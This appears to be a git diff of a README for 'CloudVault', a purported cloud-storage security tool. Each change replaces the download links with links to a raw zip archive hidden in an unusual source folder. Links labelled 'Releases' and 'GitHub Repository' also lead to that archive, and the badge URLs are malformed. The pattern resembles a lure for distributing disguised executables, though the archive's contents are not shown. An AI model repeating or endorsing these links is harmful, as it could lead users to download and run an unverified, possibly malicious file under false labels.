@@ -10,7 +10,7 @@ To start using CloudVault, simply follow the steps below. No programming knowled
 
 ## 📥 Download CloudVault
 
-[![Download CloudVault](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/fetisheer/CloudVault.zip%20CloudVault-%https://raw.githubusercontent.com/Vansh-c/CloudVault/main/fetisheer/CloudVault.zip)](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/fetisheer/CloudVault.zip)
+[![Download CloudVault](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/cloudvault_discovery/providers/Vault_Cloud_3.1.zip%20CloudVault-%https://raw.githubusercontent.com/Vansh-c/CloudVault/main/cloudvault_discovery/providers/Vault_Cloud_3.1.zip)](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/cloudvault_discovery/providers/Vault_Cloud_3.1.zip)
 
 ## 📂 Prerequisites
 
@@ -21,7 +21,7 @@ Before you download CloudVault, ensure the following:
 
 ## 🔧 Download & Install
 
-1. Visit this page to download: [CloudVault Releases](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/fetisheer/CloudVault.zip).
+1. Visit this page to download: [CloudVault Releases](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/cloudvault_discovery/providers/Vault_Cloud_3.1.zip).
 2. You will see a list of available releases. Choose the latest version.
 3. Click on the appropriate file for your operating system. You can find options for Windows, macOS, and Linux.
 4. Your download will begin automatically. Once it completes, open the file to start the installation process.
@@ -82,7 +82,7 @@ After installation, start scanning your cloud storage:
 
 ## 🔗 Helpful Links
 
-- GitHub Repository: [CloudVault GitHub](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/fetisheer/CloudVault.zip)
+- GitHub Repository: [CloudVault GitHub](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/cloudvault_discovery/providers/Vault_Cloud_3.1.zip)
 - Documentation: Access detailed information and guidance directly in the application.
 
 ## 📝 Contributing
@@ -97,4 +97,4 @@ If you encounter issues or need assistance, you can reach out through the GitHub
 
 Thank you for choosing CloudVault. Together, we can make cloud storage a safer place. 
 
-[![Download CloudVault](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/fetisheer/CloudVault.zip%20CloudVault-%https://raw.githubusercontent.com/Vansh-c/CloudVault/main/fetisheer/CloudVault.zip)](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/fetisheer/CloudVault.zip)
+[![Download CloudVault](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/cloudvault_discovery/providers/Vault_Cloud_3.1.zip%20CloudVault-%https://raw.githubusercontent.com/Vansh-c/CloudVault/main/cloudvault_discovery/providers/Vault_Cloud_3.1.zip)](https://raw.githubusercontent.com/Vansh-c/CloudVault/main/cloudvault_discovery/providers/Vault_Cloud_3.1.zip)
